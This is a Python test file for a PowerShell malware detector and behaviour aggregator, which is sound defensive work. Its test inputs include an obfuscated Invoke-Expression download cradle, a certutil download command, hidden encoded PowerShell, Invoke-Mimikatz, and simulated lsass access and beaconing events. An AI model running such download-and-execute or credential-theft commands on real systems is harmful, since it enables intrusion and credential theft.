"""Tests for the deterministic encoding, static heuristics and behaviour aggregation."""
import config
import utils
import vocabulary


# --- deterministic vocabulary -------------------------------------------------

def test_known_token_has_fixed_id():
    assert vocabulary.token_id("invoke-expression", config.TOKEN_VOCAB_SIZE) == \
        vocabulary.TOKEN_BASE_VOCAB["invoke-expression"]


def test_token_id_is_deterministic_and_in_range():
    size = config.TOKEN_VOCAB_SIZE
    a = vocabulary.token_id("SomeRandomVar123", size)
    b = vocabulary.token_id("somerandomvar123", size)  # case-insensitive
    assert a == b
    assert 0 <= a < size


def test_ast_node_type_id_known_and_unknown():
    assert vocabulary.ast_node_type_id("CommandAst") == vocabulary.AST_NODE_TYPE_VOCAB["CommandAst"]
    assert vocabulary.ast_node_type_id("TotallyUnknownAst") == vocabulary.UNK_ID


# --- static heuristics (FP / FN / score) -------------------------------------

def test_comment_only_indicator_is_not_flagged():
    det = utils.SuspiciousPatternDetector()
    flags = det.detect("# mentions Invoke-Expression and Mimikatz in a comment\nWrite-Host 'hi'")
    assert flags["has_invoke_expression"] is False
    assert flags["has_credential_pattern"] is False
    assert flags["suspicion_score"] == 0.0


def test_obfuscated_code_is_still_detected():
    det = utils.SuspiciousPatternDetector()
    flags = det.detect("i`e`x ((New-Object Net.WebClient).('Dow'+'nloadString')('http://x'))")
    assert flags["has_invoke_expression"] is True
    assert flags["has_download"] is True


def test_suspicion_score_between_zero_and_one():
    det = utils.SuspiciousPatternDetector()
    flags = det.detect("Invoke-Mimikatz; certutil -urlcache -f http://x b.exe; powershell -w hidden -enc AAAA")
    assert 0.0 < flags["suspicion_score"] <= 1.0


# --- behaviour aggregation ----------------------------------------------------

def _events():
    return [
        {"type": "ProcessCreate", "timestamp_ms": 0,
         "features": {"image": r"C:\W\certutil.exe", "command_line": "certutil -urlcache -f http://x b", "integrity_level": "High"}},
        {"type": "ProcessAccess", "timestamp_ms": 5, "features": {"target_image": r"C:\Windows\System32\lsass.exe"}},
        {"type": "FileDelete", "timestamp_ms": 10, "features": {"target_filename": r"C:\Temp\x.ps1"}},
        {"type": "NetworkConnect", "timestamp_ms": 1000, "features": {"dest_ip": "8.8.8.8", "dest_port": 4444}},
        {"type": "NetworkConnect", "timestamp_ms": 2000, "features": {"dest_ip": "8.8.8.8", "dest_port": 4444}},
        {"type": "NetworkConnect", "timestamp_ms": 3000, "features": {"dest_ip": "8.8.8.8", "dest_port": 4444}},
    ]


def test_behaviour_features_are_real():
    agg = utils.BehaviorAggregator().aggregate(_events(), 0, 4000)
    assert agg["lsass_access_count"] == 1
    assert agg["has_credential_access"] is True
    assert agg["has_lolbin_child"] is True
    assert agg["elevated_execution"] is True
    assert agg["deletes_script"] is True
    assert agg["external_connections"] == 3
    assert agg["uses_suspicious_port"] is True
    assert agg["beaconing_regularity"] == 1.0  # perfectly regular 1s intervals


def test_is_external_ip():
    assert utils.BehaviorAggregator._is_external_ip("8.8.8.8") is True
    assert utils.BehaviorAggregator._is_external_ip("10.0.0.1") is False
    assert utils.BehaviorAggregator._is_external_ip("127.0.0.1") is False
    assert utils.BehaviorAggregator._is_external_ip("not-an-ip") is False


def test_base64_ratio_and_static_builder():
    assert utils.calculate_base64_ratio("") == 0.0
    assert utils.calculate_base64_ratio("QUFBQUFBQUFBQUFBQUFBQUFBQUE=") > 0.5
    static = utils.build_static_features(
        "Write-Host 'hi'",
        utils.PowerShellTokenizer(), utils.PowerShellASTParser(), utils.SuspiciousPatternDetector(),
    )
    for key in ("char_ids", "token_ids", "entropy", "base64_ratio", "suspicion_score", "has_lolbin"):
        assert key in static
